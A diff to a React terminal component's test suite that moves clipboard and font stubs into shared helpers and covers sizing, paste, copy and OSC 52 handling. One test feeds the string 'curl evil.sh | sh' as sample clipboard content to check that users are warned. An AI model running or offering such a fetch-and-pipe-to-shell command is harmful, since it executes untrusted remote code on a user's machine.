@@ -110,6 +110,7 @@ import { TerminalView, type TerminalHandle } from './TerminalView';
 import { Toaster } from '@ui';
 import { setTerminalFontSize } from './fontSize';
 import { usePrefixKeys } from '../workspaces/keys';
+import { stubClipboard, stubProperty } from '../test-utils';
 
 describe('TerminalView sizing', () => {
   it('refits once per frame, tells the PTY only real size changes, and remeasures once the font loads', async () => {
@@ -119,7 +120,8 @@ describe('TerminalView sizing', () => {
     vi.stubGlobal('requestAnimationFrame', (cb: FrameRequestCallback) => frames.push(cb));
     vi.stubGlobal('cancelAnimationFrame', () => {});
     let fontLoaded: () => void = () => {};
-    Object.defineProperty(document, 'fonts', { configurable: true, value: { load: () => new Promise<void>((r) => { fontLoaded = r; }) } });
+    // jsdom has no FontFaceSet.
+    stubProperty(document, 'fonts', { load: () => new Promise<void>((r) => { fontLoaded = r; }) });
     const { unmount } = render(<TerminalView sessionId="s1" />);
     expect(h.sock!.resizes).toEqual(['80x24']);
     observed!();
@@ -137,9 +139,6 @@ describe('TerminalView sizing', () => {
     frames.splice(0).forEach((f) => f(0));
     expect(h.sock!.resizes).toEqual(['80x24', '80x30', '80x28']);
     unmount();
-    // @ts-expect-error jsdom has no FontFaceSet; remove the stub.
-    delete document.fonts;
-    vi.unstubAllGlobals();
   });
 });
 
@@ -279,7 +278,7 @@ describe('TerminalView', () => {
   });
 
   it('pastes the clipboard as a paste through the handle', async () => {
-    Object.defineProperty(navigator, 'clipboard', { value: { readText: vi.fn().mockResolvedValue('hi') }, configurable: true });
+    stubClipboard({ readText: vi.fn().mockResolvedValue('hi') });
     const handle = createRef<TerminalHandle>();
     render(<TerminalView sessionId="s1" handle={handle} />);
     act(() => handle.current!.paste());
@@ -319,7 +318,7 @@ describe('TerminalView', () => {
     it('a long press selects the word under the finger and offers Copy', async () => {
       vi.useFakeTimers();
       const writeText = vi.fn().mockResolvedValue(undefined);
-      Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+      stubClipboard({ writeText });
       const el = setup();
       h.term!.lines = ['', 'see web/src/main.tsx now'];
       fireEvent.touchStart(el, at(85, 25)); // column 8, row 1
@@ -382,7 +381,7 @@ describe('TerminalView', () => {
 
   it('copies OSC 52 text to the clipboard but never reveals the clipboard', async () => {
     const writeText = vi.fn().mockResolvedValue(undefined);
-    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+    stubClipboard({ writeText });
     render(<TerminalView sessionId="s1" />);
     await h.clipboard!.writeText('c', 'copied');
     expect(writeText).toHaveBeenCalledWith('copied');
@@ -390,7 +389,7 @@ describe('TerminalView', () => {
   });
 
   it('tells the user when a program sets the clipboard, with the start of the text', async () => {
-    Object.defineProperty(navigator, 'clipboard', { value: { writeText: vi.fn().mockResolvedValue(undefined) }, configurable: true });
+    stubClipboard({ writeText: vi.fn().mockResolvedValue(undefined) });
     render(<><Toaster /><TerminalView sessionId="s1" /></>);
     await act(() => h.clipboard!.writeText('c', `curl evil.sh |\n  sh ${'x'.repeat(100)}`));
     expect(await screen.findByText('The terminal set your clipboard')).toBeInTheDocument();
@@ -404,7 +403,7 @@ describe('TerminalView', () => {
 
   it('copies a mouse selection to the clipboard when the mouse is released', () => {
     const writeText = vi.fn().mockResolvedValue(undefined);
-    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+    stubClipboard({ writeText });
     render(<TerminalView sessionId="s1" />);
     fireEvent.mouseUp(document);
     expect(writeText).not.toHaveBeenCalled(); // no selection made
